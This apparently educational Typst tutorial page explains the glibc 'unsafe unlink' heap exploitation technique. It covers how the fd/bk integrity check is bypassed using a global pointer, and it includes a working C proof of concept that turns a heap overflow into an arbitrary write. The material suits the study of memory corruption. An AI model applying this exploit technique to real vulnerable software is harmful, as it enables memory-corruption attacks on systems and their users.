#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Unsafe Unlink",
    description: "Exploiting the unlink macro to achieve arbitrary write by corrupting pointers.",
    date: "2025-12-26",
    order: 28,
  ),
)<frontmatter>

= Unsafe Unlink

== Introduction

The `unlink` vulnerability occurs when a program can trigger the removal of a chunk from a doubly-linked list (like the unsorted, small, or large bins) while having control over the chunk's metadata (`fd` and `bk` pointers).

In modern glibc versions, a crucial check was introduced to prevent simple `unlink` attacks:
```c
if (__builtin_expect (p->fd->bk != p || p->bk->fd != p, 0))
  malloc_printerr ("unlink_chunk(): corrupted double-linked list");
```
To bypass this, we need a known pointer that points to our chunk. The most common scenario is a global pointer to a heap allocation.

== Prerequisites
- *Global Pointer*: Ability to find a known, static address (like a global variable) that contains a pointer to the target heap chunk.
- *Heap Overflow / UAF*: Ability to overwrite the `fd` and `bk` pointers of the target chunk.
- *Unlink Trigger*: Ability to trigger the `unlink` macro, typically by freeing an adjacent chunk to induce backward or forward consolidation.

== The Technique

The goal is to forge a fake chunk such that:
1. `P->fd->bk == P`
2. `P->bk->fd == P`

If we have a global pointer `P_ptr` that points to chunk `P`, we can set:
- `P->fd = &P_ptr - 3*sizeof(void*)`
- `P->bk = &P_ptr - 2*sizeof(void*)`

When `unlink(P)` is called:
- `FD = P->fd` (which is `&P_ptr - 3`)
- `BK = P->bk` (which is `&P_ptr - 2`)
- `FD->bk = BK` -> `*(&P_ptr - 3 + 3) = &P_ptr - 2` -> `P_ptr = &P_ptr - 2`
- `BK->fd = FD` -> `*(&P_ptr - 2 + 2) = &P_ptr - 3` -> `P_ptr = &P_ptr - 3`

The result is that `P_ptr` now points slightly before itself. We can then use `P_ptr` to overwrite itself with any address, achieving an arbitrary write primitive.

== Implementation Example

The following code (tested on Ubuntu 20.04) demonstrates the attack using a global pointer.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("Welcome to unsafe unlink 2.0!\n");

	// Large enough to avoid tcache/fastbin
	int malloc_size = 0x420;
	int header_size = 2;

	chunk0_ptr = (uint64_t*) malloc(malloc_size); // chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); // chunk1

	printf("Global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("Victim chunk is at %p\n\n", chunk1_ptr);

	/*
	   1. Create a fake chunk inside chunk0.
	   Bypass: (P->fd->bk != P || P->bk->fd != P) == False
	*/

	// Set fake prev_size to match chunk0's actual size
	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;

	// P->fd = &P - 3
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	// P->bk = &P - 2
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);

	/*
	   2. Trigger backward consolidation.
	   We assume an overflow from chunk0 into chunk1's metadata.
	*/
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;

	// Set chunk1->prev_size to point to our fake chunk
	chunk1_hdr[0] = malloc_size;

	// Clear PREV_INUSE bit of chunk1
	chunk1_hdr[1] &= ~1;

	/*
	   3. Free chunk1 to trigger unlink(chunk0)
	*/
	free(chunk1_ptr);

	/*
	   4. Now chunk0_ptr points to (&chunk0_ptr - 3).
	   We can use it to achieve arbitrary write.
	*/
	char victim_string[8];
	strcpy(victim_string,"Hello!~");

	// Overwrite chunk0_ptr with the address of victim_string
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("Original value: %s\n", victim_string);
	// Perform the arbitrary write
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n", victim_string);

	assert(*(long *)victim_string == 0x4141414142424242L);
}
```

== Key Takeaways

- *Requirement*: A known location (usually global/static memory) containing a pointer to the chunk.
- *Capability*: Transforms a heap overflow/UAF into an arbitrary write.
- *Modern Defense*: Safe-linking and tcache often require bypassing or filling the tcache first before this technique can be used on bins that use `unlink`.

